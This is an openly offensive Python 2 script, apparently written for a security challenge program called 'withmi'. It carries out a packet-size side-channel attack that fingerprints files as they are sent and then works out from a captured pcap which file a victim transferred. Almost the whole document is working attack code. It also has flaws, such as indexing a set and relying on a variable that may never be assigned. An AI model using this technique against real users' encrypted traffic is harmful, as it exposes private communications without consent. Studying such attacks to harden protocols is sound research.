import argparse
import json
import sys
import packetcollector
import processcommspackets
import time
import numpy
from withmi_client import WithMiClient
import uuid
import os
import pexpect
import collections
# used for side channel attack to determine what file was transferred

# work around for this issue:
# http://stackoverflow.com/questions/5530708/can-i-redirect-unicode-output-from-the-console-directly-into-a-file
import codecs
sys.stdout=codecs.getwriter('utf-8')(sys.stdout)

def send_file(i):
	child = pexpect.spawn("../../../challenge_program/bin/withmi -d ../../../challenge_program/data -s ../../../challenge_program/data/victim -i ../../../examples/matilda.id")
	child.sendline("createchat transfer")
	child.sendline("connect localhost 9002")
	time.sleep(1)
	child.sendline("adduser megan")
 	time.sleep(1)
	child.sendline("sendFile " + str(i))
	time.sleep(20)
	child.sendline("exit")



class FileIdDb(object):
	DIFF=9 # difference in size between first connection message and the text message that comes after a file transfer
 
	def __init__(self, hostname, port):
		self.hostname = hostname
		self.port = port
		self.num_chunks = set([]) # sizes of fingerprints in known files

		# maps filename to chunk size fingerprint
		self.file_chunk_size_map = collections.OrderedDict()
       
    # from messages without setup, extract the sizes of those that are
    # part of the file transfer (assumes only one file transfer and no other
    # interactions are present).  Also assumes client was sender.
	def extract_signature(self, messages):
		signature = []
		client_count=0
		in_transfer = False
		for msg in messages:
			if msg.is_client():
				client_count+=1
				if in_transfer:
					sz = msg.get_size()
					if sz-norm==self.DIFF: #this is the text msg that comes after a file transfer
						self.num_chunks.add(len(signature)-1) # drop the last one, may be affected by padding
						return signature[0:-1]
					else:
						signature.append(msg.get_size()-norm)
				else:
					if client_count==1: # we will normalize by the length of this first message
						norm = msg.get_size()
					if client_count==2:
						in_transfer = True
			
		print "returning signature from other branch"
		return signature 

	
	# is listA the initial segment of listB
	def is_subsequence(self, listA, listB):
		if len(listA)>len(listB):
			return False
		for i in range(len(listA)):
			if listA[i]!=listB[i]:
				return False
		return True
	
	# from messages without setup, 
	# determine which known files were transfered
	def find_known_files(self, messages):
		client_msg_sizes = []
		server_msg_sizes = []
		for msg in messages:
			if msg.is_client():
				client_msg_sizes.append(msg.get_size())
			else:
				server_msg_sizes.append(msg.get_size())
		files_sent_as_client = self.find_file_sigs(client_msg_sizes)
		files_sent_as_server = self.find_file_sigs(server_msg_sizes)	
		files_sent_as_client.update(files_sent_as_server)
		return files_sent_as_client # this now contains the server ones too

	# find file chunk size signatures contained in a list of message 
	# sizes sent from one user to another,
	def find_file_sigs(self, size_seqs):
		files_found = collections.OrderedDict()
		norm = size_seqs[0]
		for num in [self.num_chunks[0]]:
			for i in range(len(size_seqs)-num+1):
				candidate = size_seqs[i:i+num]
				candidate = [entry-norm for entry in candidate]
				for (sig, files) in self.sig_to_file.items():
					if self.is_subsequence(candidate, eval(sig)) or self.is_subsequence(eval(sig), candidate):
						if str(candidate) in files_found:
							files_found[str(candidate)] = files_found[str(candidate)].union(files)
						else:
							files_found[str(candidate)] = set(files)

		return files_found

	# build up database of files and corresponding compressed chunk sizes
	def build(self, interface, fileDir):
		filenum=0
		for root, directories, filenames in os.walk(fileDir):
			for filename in sorted(filenames):
				msgs = []
				with packetcollector.PacketCollector(interface, "tcp port {}".format(self.port)) as packet_collector:
					send_file(filenum)
					filenum+=1		        
					# give it time for the packets to be collected
					time.sleep(5)
					packet_collector.stop()
					pcap = packet_collector.get_pcap()
					conversations = processcommspackets.get_conversations(pcap, self.hostname, self.port)
					for id, conversation in conversations.items():
						msgs.extend( conversation.get_messages_without_setup())
					self.file_chunk_size_map[filename] = self.extract_signature(msgs)
		
		       

	def save(self, db_filename):
		'''
		Saves the database to the file
 		'''
		print "saving to " + db_filename
		with open(db_filename, 'w') as writer:
			dic = {"file_signatures" : self.file_chunk_size_map,"num_chunks": sorted(list(self.num_chunks))}
			json.dump(dic, writer)

	def load(self, db_filename):
		with open(db_filename, 'r') as reader:
			dic = json.load(reader)
			self.file_chunk_size_map = collections.OrderedDict(dic["file_signatures"])
			self.num_chunks = dic["num_chunks"]
			self.make_inverse_map()
		
	# use file_chunk_size_map to create reverse map from smallest possible signature to list of files w/ that signature	
	def make_inverse_map(self):
		sig_to_file = collections.OrderedDict()
		for (fi, sig) in self.file_chunk_size_map.items():
			found = False
			if str(sig) in sig_to_file:
				found = True
				sig_to_file[str(sig)].append(fi)
			else:
				for s, fs in sig_to_file.items():
					slist = eval(s)
					if self.is_subsequence(slist, sig) or self.is_subsequence(sig, slist):
						found = True
						if len(slist)<=len(sig):
							sig_to_file[s].append(fi)
						else:
							del sig_to_file[s]
							fs.append(fi)
							sig_to_file[str(sig)] = fs
				if not found:
					sig_to_file[str(sig)]=[fi]
		self.sig_to_file = sig_to_file

	def remove_duplicates(self, files):
		new_files = []
		for f in files:
			if not f in new_files:
				new_files.append(f)
		return new_files
    
	def merge_equiv_sigs(self, dic):
		merged = collections.OrderedDict()
		for sig, files in dic.items():
			others = [(s, fs) for (s, fs) in dic.items() if s!=sig]
			matched = False
			for (s, fs) in others:
				if type(sig) != list:
					sig = eval(sig) 
				s = eval(s)
				if self.is_subsequence(s, sig) or self.is_subsequence(sig, s):
					if abs(len(s)-len(sig)) <=2: 
						matched = True
						if len(s)<len(sig):
							rep = str(s)
						else:
							rep = str(sig)
						if rep not in merged:
							merged[rep] = []
						merged[str(rep)].extend(files)
						merged[str(rep)].extend(fs)
			if not matched:
				merged[str(sig)] = files
			del dic[str(sig)]
		for sig, files in merged.items():
			merged[str(sig)] = self.remove_duplicates(files)
		return merged			
				
	
	def id_files_from_pcap(self, pcap):
		sent_files = collections.OrderedDict()
		conversations = processcommspackets.get_conversations(pcap, self.hostname, self.port)
		if len(conversations)==0:
			print "Can't find any files sent - no conversations recorded"
		for id, conversation in conversations.items():
			msgs = conversation.get_messages_without_setup()
			if len(msgs) == 0:
				print "No non-setup msgs in conversation"
			known = self.find_known_files(msgs)
			sent_files.update(known) 
		return sent_files    

def find(hostname, port, dbname, pcap_file):
	attack_db = FileIdDb(hostname, port)
	attack_db.load(dbname)
	if len(attack_db.file_chunk_size_map.keys())==0:
		print "attack will fail due to empty db"
	files_sent = \
	attack_db.id_files_from_pcap(processcommspackets.read_pcap(pcap_file))
	files_sent = attack_db.merge_equiv_sigs(files_sent)
	return files_sent

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("host", help="host of other user")
    parser.add_argument("port", type=int, help="port of other user")
    subparsers = parser.add_subparsers(dest="command")
    buildparser = subparsers.add_parser('build', help='Build a new database')
    buildparser.add_argument("fileDir", help="directory of files to transfer")
    buildparser.add_argument("interface", help="the interface to use when building the database (required when building)")
    buildparser.add_argument("outfile", help="specify the filename for the database to build")

    findparser = subparsers.add_parser('find', help="identify a file from a pcap")
    findparser.add_argument('dbname', help='filename of a prebuilt database to consult')
    findparser.add_argument('pcap', help='pcap file of observed session')

    args = parser.parse_args()
    if args.command == 'build':
	db = FileIdDb(args.host, args.port)
        db.build(args.interface, args.fileDir)
	db.save(args.outfile)
    elif args.command == 'find':
        found = find(args.host, args.port, args.dbname, args.pcap)
        found_str = ""
        for sig, files in found.items():
        	if found_str!="":
        		found_str += " and\n"
        	found_str+= " or ".join(sorted(files))
	print "pcap contains transfers of the following files:\n" + found_str

if __name__ == "__main__":
    main()
